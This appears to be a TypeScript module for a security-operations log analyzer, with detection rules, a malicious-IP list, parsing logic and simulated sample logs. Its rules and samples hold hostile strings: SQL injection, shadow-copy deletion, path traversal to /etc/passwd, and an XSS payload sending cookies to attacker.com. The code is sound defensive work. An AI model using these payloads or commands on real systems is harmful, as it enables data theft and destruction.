import { LogEntry, DetectionRule, Severity, ThreatCategory, LogSource, RuleMatch } from '../types/soc';

export const DEFAULT_DETECTION_RULES: DetectionRule[] = [
  {
    id: 'RULE-SQLI-001',
    name: 'SQL Injection Attack Pattern',
    severity: 'critical',
    category: 'sqli',
    mitreId: 'T1190',
    mitreTactic: 'Initial Access',
    pattern: 'UNION SELECT, OR 1=1, xp_cmdshell, SLEEP(), benchmark, -- or # comment injection',
    regexString: "(\\b(union(\\s+all)?\\s+select|select.*from|insert\\s+into|delete\\s+from|drop\\s+table|xp_cmdshell|exec(\\s+master)?|benchmark\\(|sleep\\(\\d+\\))|'\\s*(or|and)\\s*['\"\\d]+=|[;\\-]{2,}\\s*$)",
    enabled: true,
    hits: 14,
    description: 'Detects structured query injection attempts designed to bypass authentication or extract sensitive backend database records.',
    remediation: 'Implement parameterized SQL queries / ORM prepared statements, sanitize input through WAF inspection, and apply database least-privilege principles.'
  },
  {
    id: 'RULE-XSS-002',
    name: 'Cross-Site Scripting (XSS) Vector',
    severity: 'high',
    category: 'xss',
    mitreId: 'T1190',
    mitreTactic: 'Execution',
    pattern: '<script>, javascript:, onerror=, onload=, document.cookie reflection',
    regexString: "(<script[\\s\\S]*?>|javascript:[^\"'\\s]+|onload\\s*=|onerror\\s*=|eval\\s*\\(|document\\.cookie)",
    enabled: true,
    hits: 8,
    description: 'Detects malicious JavaScript injection attempts targeting client-side browser execution and session token exfiltration.',
    remediation: 'Apply Content Security Policy (CSP) headers, encode HTML entities upon output rendering, and sanitize request payloads.'
  },
  {
    id: 'RULE-BRUTE-003',
    name: 'Credential Brute-Force / Password Spraying',
    severity: 'high',
    category: 'brute_force',
    mitreId: 'T1110',
    mitreTactic: 'Credential Access',
    pattern: 'Failed password, login failed, multiple 401 Unauthorized, EventID 4625',
    regexString: "(Failed password for|authentication failure|logon failure|EventID 4625|status=401|invalid credentials)",
    enabled: true,
    hits: 27,
    description: 'Detects repeated failed authentication attempts indicating automated dictionary attacks, credential stuffing, or brute force attempts.',
    remediation: 'Enforce rate-limiting on authentication endpoints, mandate multi-factor authentication (MFA), and temporarily null-route offending IPs.'
  },
  {
    id: 'RULE-RANSOM-004',
    name: 'Ransomware Shadow Copy Deletion & Inhibit Recovery',
    severity: 'critical',
    category: 'ransomware',
    mitreId: 'T1490',
    mitreTactic: 'Impact',
    pattern: 'vssadmin delete shadows, wbadmin delete, bcdedit /set recoveryenabled no',
    regexString: "(vssadmin\\s+(delete|resize)\\s+shadows|wbadmin\\s+delete\\s+catalog|bcdedit.*recoveryenabled\\s+No|wmic\\s+shadowcopy\\s+delete|cipher\\.exe\\s+/w)",
    enabled: true,
    hits: 5,
    description: 'Detects execution of administrative commands used by ransomware operators to inhibit system restore and delete Volume Shadow Copies prior to mass encryption.',
    remediation: 'Immediately isolate affected host from network, revoke local admin tokens, and review active EDR containment alerts.'
  },
  {
    id: 'RULE-PRIV-005',
    name: 'Privilege Escalation & Sudo Abuse',
    severity: 'critical',
    category: 'privilege_escalation',
    mitreId: 'T1548',
    mitreTactic: 'Privilege Escalation',
    pattern: 'sudoers modified, sudo without tty, mimikatz, sekurlsa, seDebugPrivilege',
    regexString: "(sudo.*COMMAND=/bin/(bash|sh)|visudo|mimikatz|sekurlsa::logonpasswords|SeDebugPrivilege|token::elevate)",
    enabled: true,
    hits: 6,
    description: 'Detects local user execution escalating to superuser privileges or extraction of LSASS memory credentials.',
    remediation: 'Audit sudoers file configuration, restrict LSASS memory read access via Credential Guard, and lock compromised account.'
  },
  {
    id: 'RULE-C2-006',
    name: 'Command & Control (C2) / Data Exfiltration',
    severity: 'high',
    category: 'c2_beacon',
    mitreId: 'T1071',
    mitreTactic: 'Command and Control',
    pattern: 'Suspicious outbound beacon, Cobalt Strike artifacts, abnormal DNS TXT tunneling, sqlmap/nikto user agents',
    regexString: "(cobaltstrike|beacon\\.bin|meterpreter|sqlmap/|nikto/|masscan/|nmap/|curl/\\d.*suspicious|tunnel\\.sh)",
    enabled: true,
    hits: 11,
    description: 'Detects outbound traffic matching known adversary penetration testing tools, RAT beacons, or automated vulnerability scanners.',
    remediation: 'Block malicious external destination IP / C2 domain on perimeter firewall and inspect egress proxy connection logs.'
  },
  {
    id: 'RULE-PORTSCAN-007',
    name: 'Port Scanning & Host Reconnaissance',
    severity: 'medium',
    category: 'port_scan',
    mitreId: 'T1046',
    mitreTactic: 'Discovery',
    pattern: 'SYN Flood, rapid multi-port probing, Nmap discovery probe',
    regexString: "(port\\s+scan|syn_flood|tcp_scan|unauthorized\\s+port\\s+probe|probe.*port\\s+(22|23|445|3389|8080))",
    enabled: true,
    hits: 19,
    description: 'Detects adversary port enumeration and network service reconnaissance prior to exploitation attempts.',
    remediation: 'Ensure non-public ports are closed or behind VPN/Zero Trust boundary, and rate-limit TCP SYN flags on perimeter gateway.'
  },
  {
    id: 'RULE-DIRTRAV-008',
    name: 'Path Traversal / Arbitrary File Read',
    severity: 'high',
    category: 'directory_traversal',
    mitreId: 'T1006',
    mitreTactic: 'Defense Evasion',
    pattern: '../, ..\\, /etc/passwd, /boot.ini, %2e%2e%2f',
    regexString: "(\\.\\.[\\/\\\\]|\\%2e\\%2e[\\/\\\\]|\\/etc\\/passwd|\\/etc\\/shadow|C:\\\\[Ww]indows\\\\[Ss]ystem32)",
    enabled: true,
    hits: 9,
    description: 'Detects path traversal sequences aimed at escaping web root and viewing sensitive server configuration or password files.',
    remediation: 'Canonicalize file paths before opening, disable direct filesystem mapping, and verify user permissions on storage layers.'
  }
];

// Well-known high-risk threat actor IPs for simulation and IOC correlation
export const KNOWN_MALICIOUS_IPS = new Set([
  '185.220.101.5',   // Known Tor Exit Node / Scanner
  '45.145.185.10',   // Known Botnet / Brute force source
  '194.26.29.112',   // Bulletproof hosting / Exploit attempt
  '103.149.28.18',   // SSH scanning network
  '91.240.118.232',  // C2 Cobalt Strike beacon IP
  '198.51.100.44'    // Test malicious IP
]);

/**
 * Parses raw log string into structured LogEntry
 */
export function parseLogLine(raw: string, defaultSource: LogSource = 'syslog'): LogEntry {
  const trimmed = raw.trim();
  const id = 'log_' + Math.random().toString(36).substring(2, 11);
  const now = new Date().toISOString();

  // Try parsing JSON format
  if (trimmed.startsWith('{') && trimmed.endsWith('}')) {
    try {
      const parsed = JSON.parse(trimmed);
      const ip = parsed.src_ip || parsed.client_ip || parsed.sourceIp || parsed.ip || extractIp(trimmed) || '192.168.1.105';
      const host = parsed.host || parsed.hostname || parsed.sourceHost || 'srv-core-01';
      const user = parsed.user || parsed.username || parsed.account;
      const detected = evaluateRules(trimmed, DEFAULT_DETECTION_RULES);

      return {
        id,
        timestamp: parsed.timestamp || parsed['@timestamp'] || now,
        source: (parsed.source as LogSource) || defaultSource,
        raw: trimmed,
        sourceHost: host,
        sourceIp: ip,
        destinationIp: parsed.dst_ip || parsed.destinationIp,
        destinationPort: parsed.dst_port ? Number(parsed.dst_port) : undefined,
        user,
        severity: detected.severity,
        category: detected.category,
        isMalicious: detected.isMalicious,
        isSuspicious: detected.isSuspicious,
        confidenceScore: detected.confidenceScore,
        ruleMatched: detected.ruleMatched,
        metadata: parsed
      };
    } catch {
      // Fallback to text parsing
    }
  }

  // Extract IP
  const ip = extractIp(trimmed) || '10.0.4.15';
  
  // Detect Log Source
  let source: LogSource = defaultSource;
  if (/HTTP\/\d\.\d|GET |POST |PUT |DELETE |status=\d{3}/i.test(trimmed)) {
    source = 'web';
  } else if (/sshd|Failed password|pam_unix|sudo:|Accepted password/i.test(trimmed)) {
    source = 'auth';
  } else if (/CEF:|FortiGate|Cisco|Firewall|DROP|ACCEPT|src=\d/i.test(trimmed)) {
    source = 'firewall';
  } else if (/Sysmon|EventID|Process Create|vssadmin|powershell/i.test(trimmed)) {
    source = 'edr';
  } else if (/CloudTrail|AWS|AssumeRole|ConsoleLogin/i.test(trimmed)) {
    source = 'cloudtrail';
  }

  // Extract host
  let host = 'gateway-edge-01';
  const hostMatch = trimmed.match(/\b(srv-[a-z0-9-]+|host-[a-z0-9-]+|[a-zA-Z0-9-]+\.(?:corp|internal|local)|HR-PC-\d+|DESKTOP-[A-Z0-9]+)\b/i);
  if (hostMatch) {
    host = hostMatch[0];
  } else if (source === 'web') {
    host = 'prod-web-ingress';
  } else if (source === 'auth') {
    host = 'auth-bastion-01';
  }

  // Extract user if available
  let user: string | undefined;
  const userMatch = trimmed.match(/(?:user|user=|account|Account:|for invalid user|for user)\s+([a-zA-Z0-9._-]+)/i);
  if (userMatch) {
    user = userMatch[1];
  }

  // Evaluate detection rules
  const detected = evaluateRules(trimmed, DEFAULT_DETECTION_RULES, ip);

  return {
    id,
    timestamp: extractTimestamp(trimmed) || now,
    source,
    raw: trimmed,
    sourceHost: host,
    sourceIp: ip,
    user,
    severity: detected.severity,
    category: detected.category,
    isMalicious: detected.isMalicious,
    isSuspicious: detected.isSuspicious,
    confidenceScore: detected.confidenceScore,
    ruleMatched: detected.ruleMatched
  };
}

/**
 * Extracts IPv4 address from text
 */
export function extractIp(text: string): string | null {
  const match = text.match(/\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\b/);
  return match ? match[0] : null;
}

/**
 * Extracts ISO-like or log-style timestamp
 */
export function extractTimestamp(text: string): string | null {
  // ISO 8601
  const isoMatch = text.match(/\d{4}-\d{2}-\d{2}[T\s]\d{2}:\d{2}:\d{2}(?:\.\d+)?(?:Z|[+-]\d{2}:\d{2})?/);
  if (isoMatch) return new Date(isoMatch[0].replace(' ', 'T')).toISOString();

  // Syslog: "Oct 28 12:15:30"
  const syslogMatch = text.match(/([A-Z][a-z]{2}\s+\d{1,2}\s+\d{2}:\d{2}:\d{2})/);
  if (syslogMatch) {
    const year = new Date().getFullYear();
    const d = new Date(`${syslogMatch[1]} ${year}`);
    if (!isNaN(d.getTime())) return d.toISOString();
  }

  return null;
}

/**
 * Evaluates rules against a raw log string and IP reputation
 */
export function evaluateRules(
  text: string, 
  rules: DetectionRule[], 
  ip?: string
): {
  severity: Severity;
  category: ThreatCategory;
  isMalicious: boolean;
  isSuspicious: boolean;
  confidenceScore: number;
  ruleMatched?: RuleMatch;
} {
  const lowerText = text.toLowerCase();
  const isKnownBadIp = ip ? KNOWN_MALICIOUS_IPS.has(ip) : false;

  for (const rule of rules) {
    if (!rule.enabled) continue;

    let matched = false;
    if (rule.regexString) {
      try {
        const regex = new RegExp(rule.regexString, 'i');
        matched = regex.test(text);
      } catch {
        // Fallback to substring pattern check
        matched = rule.pattern.split(',').some(p => lowerText.includes(p.trim().toLowerCase()));
      }
    } else {
      matched = rule.pattern.split(',').some(p => lowerText.includes(p.trim().toLowerCase()));
    }

    if (matched) {
      const isCriticalOrHigh = rule.severity === 'critical' || rule.severity === 'high';
      const confidence = isKnownBadIp ? 98 : (isCriticalOrHigh ? 92 : 75);

      return {
        severity: rule.severity,
        category: rule.category,
        isMalicious: isCriticalOrHigh,
        isSuspicious: !isCriticalOrHigh,
        confidenceScore: confidence,
        ruleMatched: {
          id: rule.id,
          name: rule.name,
          mitreId: rule.mitreId,
          mitreTactic: rule.mitreTactic,
          description: rule.description,
          remediation: rule.remediation
        }
      };
    }
  }

  // If known bad IP but didn't trigger specific signature
  if (isKnownBadIp) {
    return {
      severity: 'medium',
      category: 'unauthorized_access',
      isMalicious: false,
      isSuspicious: true,
      confidenceScore: 78,
      ruleMatched: {
        id: 'IOC-IP-REPUTATION',
        name: 'Traffic from Known Malicious IP / Tor Exit Node',
        mitreId: 'T1071',
        mitreTactic: 'Command and Control',
        description: `Source IP ${ip} is flagged in threat intelligence feeds for malicious activities.`,
        remediation: 'Add IP to edge perimeter blocklist and scrutinize session history.'
      }
    };
  }

  // Benign / Clean Log
  return {
    severity: 'info',
    category: 'normal',
    isMalicious: false,
    isSuspicious: false,
    confidenceScore: 10,
    ruleMatched: undefined
  };
}

/**
 * Generates realistic sample logs for simulation
 */
export function generateSampleLogs(): LogEntry[] {
  const samples = [
    // SQL Injection
    '185.220.101.5 - - [28/Oct/2026:12:04:11 +0000] "GET /api/v1/products?category=electronics%20UNION%20SELECT%20null,username,password%20FROM%20admin_users-- HTTP/1.1" 200 8421 "https://corp.com/" "sqlmap/1.6.12"',
    // Ransomware Shadow Copy Deletion
    'EventID 1 Sysmon Process Create: Host=HR-PC-04 User=corp\\asmith Process=C:\\Windows\\System32\\vssadmin.exe Command="vssadmin delete shadows /all /quiet" Parent=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
    // SSH Brute Force
    'Oct 28 12:05:22 auth-bastion-01 sshd[4912]: Failed password for invalid user root from 45.145.185.10 port 49122 ssh2',
    // Normal Web Request
    '192.168.1.45 - - [28/Oct/2026:12:05:40 +0000] "GET /dashboard/overview HTTP/1.1" 200 3241 "https://corp.com/dashboard" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"',
    // Privilege Escalation
    'Oct 28 12:06:01 prod-db-node sudo: pam_unix(sudo:auth): authentication failure; logname=jdoe uid=1001 euid=0 tty=/dev/pts/2 ruser=jdoe rhost= user=root COMMAND=/bin/bash',
    // XSS injection
    '194.26.29.112 - - [28/Oct/2026:12:06:15 +0000] "POST /feedback HTTP/1.1" 200 512 "https://corp.com/feedback" "Mozilla/5.0 <script>document.location=\'http://attacker.com/steal?c=\'+document.cookie</script>"',
    // Port Scan
    'CEF:0|Fortinet|FortiGate|v7.2|1002|Port Scan Detected|6|src=103.149.28.18 dst=10.0.1.10 spt=60212 dpt=445 proto=TCP act=blocked msg=Unauthorized port probe sequence',
    // Normal SSH
    'Oct 28 12:07:00 auth-bastion-01 sshd[5100]: Accepted publickey for devops_admin from 10.0.2.14 port 52312 ssh2: RSA SHA256:4a8b... ',
    // C2 Beaconing
    '91.240.118.232 - - [28/Oct/2026:12:07:33 +0000] "POST /beacon.bin HTTP/1.1" 404 152 "-" "Mozilla/5.0 (compatible; CobaltStrike/4.8)"',
    // Directory Traversal
    '194.26.29.112 - - [28/Oct/2026:12:08:02 +0000] "GET /download?file=../../../../etc/passwd HTTP/1.1" 403 280 "-" "curl/7.81.0"'
  ];

  return samples.map(line => parseLogLine(line));
}
